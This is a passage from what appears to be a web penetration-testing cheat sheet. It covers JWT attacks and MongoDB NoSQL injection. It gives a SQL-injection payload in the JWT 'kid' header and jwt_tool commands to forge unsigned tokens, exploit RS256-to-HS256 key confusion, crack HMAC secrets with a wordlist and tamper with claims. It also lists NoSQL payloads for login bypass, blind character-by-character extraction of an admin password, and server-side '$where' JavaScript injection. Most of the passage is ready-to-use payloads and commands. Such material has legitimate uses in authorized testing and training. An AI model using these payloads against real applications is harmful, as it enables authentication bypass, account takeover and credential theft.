{"alg": "HS256", "typ": "JWT", "kid": "1' UNION SELECT 'attacker-controlled-secret' -- "}
```
Then sign the token with `attacker-controlled-secret` as the HMAC key.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html#kid-issues

---

### 8.5 jwt_tool — Automating the Above
**Explanation:** Once the manual mechanics in §8.1–§8.3 are understood, [jwt_tool](https://github.com/ticarpi/jwt_tool) automates detection and exploitation of all three (plus header-injection variants like `jku`/`kid` SQLi/path-traversal) against a live token/endpoint in one pass — the practical Swiss-army-knife once you know what each check is actually doing under the hood.

**Example:**
```bash
python3 jwt_tool.py '<jwt>' -t http://target/api/endpoint -rh "Authorization: Bearer <jwt>" -M pb   # playbook scan — runs the known checks (alg:none, weak secret, etc.) live
python3 jwt_tool.py '<jwt>' -X a                        # alg:none exploit — auto-generates the unsigned variant (§8.1)
python3 jwt_tool.py '<jwt>' -X k -pk pubkey.pem         # RS256->HS256 key-confusion exploit (§8.3)
python3 jwt_tool.py '<jwt>' -C -d rockyou.txt           # HMAC secret dictionary crack (§8.2)
python3 jwt_tool.py '<jwt>' -T                          # interactive claim tampering + re-signing once you have a secret/key
```

**Reference:** https://github.com/ticarpi/jwt_tool · https://github.com/ticarpi/jwt_tool/wiki/Using-jwt_tool

---

### Consolidated Reference List
- SQL Injection (index): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md
- SQL Injection (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
- XSS: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
- File Inclusion (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html
- Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
- SSRF (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- XXE (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/xxe-xml-external-entity/index.html
- SSTI (PortSwigger): https://portswigger.net/web-security/server-side-template-injection
- SSTI Jinja2 (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html
- SSTI general/Twig (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- SSTI automation — tplmap: https://github.com/epinna/tplmap
- JWT attacks (PortSwigger): https://portswigger.net/web-security/jwt/algorithm-confusion
- JWT attacks (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
- JWT cracking (hashcat mode 16500 issue thread): https://github.com/hashcat/hashcat/issues/1057
- jwt_tool: https://github.com/ticarpi/jwt_tool
- NoSQL Injection (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
- NoSQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md
- sqlmap automation (this repo): [`web-attack-techniques.md` §5](web-attack-techniques.md#5-sqlmap--tamper-scripts--shell-escalation)

---

## 9. NoSQL Injection (MongoDB)

### 9.1 Detection & Authentication Bypass
**Explanation:** MongoDB-backed web apps (Node.js/Express, Python/Flask with PyMongo) often pass JSON request bodies directly into query operators. Unlike SQL, NoSQL injection uses operator-based payloads (`$ne`, `$gt`, `$regex`, `$where`) rather than string-breaking syntax.

**Authentication bypass (JSON body):**
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

**Query-string parameter injection (PHP/Express form handling):**
```
username=admin&password[$ne]=wrongpassword
username[$regex]=^adm&password[$ne]=x
```
Many frameworks (Express with `qs`, PHP) auto-parse bracket syntax into nested objects, so `password[$ne]=x` becomes `{password: {$ne: "x"}}` server-side.

**Reference:** https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html

---

### 9.2 Data Extraction (Blind)
**Explanation:** When injection is confirmed but data isn't reflected, extract values character-by-character using `$regex` — same concept as blind SQLi boolean-based, different syntax.

**Example — extract admin password character-by-character:**
```
{"username": "admin", "password": {"$regex": "^a"}}     login success = first char is 'a'
{"username": "admin", "password": {"$regex": "^ab"}}    success = second char is 'b'
{"username": "admin", "password": {"$regex": "^abc"}}   fail = third char is NOT 'c', try next
```
Automate with a script — iterate `[a-zA-Z0-9!@#$%...]` per position, appending confirmed chars.

**Server-side JavaScript injection (`$where`):**
```json
{"username": "admin", "$where": "this.password.match(/^a.*/i)"}
```
`$where` executes arbitrary JavaScript server-side (MongoDB < 4.4 without `mongosh` restrictions). If available, it's the most powerful injection point.

**Reference:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md
